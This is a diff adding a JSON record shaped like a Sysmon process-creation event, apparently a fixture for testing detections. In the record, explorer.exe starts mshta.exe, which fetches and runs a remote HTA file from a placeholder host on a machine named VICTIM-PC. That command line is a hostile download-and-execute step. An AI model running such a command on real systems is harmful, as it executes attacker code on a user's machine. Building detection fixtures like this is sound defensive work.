@@ -1,0 +1,8 @@
+{
+  "EventID": 1,
+  "UtcTime": "2026-09-03 12:00:03.000",
+  "ParentImage": "C:\\Windows\\explorer.exe",
+  "Image": "C:\\Windows\\System32\\mshta.exe",
+  "CommandLine": "mshta.exe http://update-service.invalid/auth/session.hta",
+  "User": "VICTIM-PC\\analyst"
+}
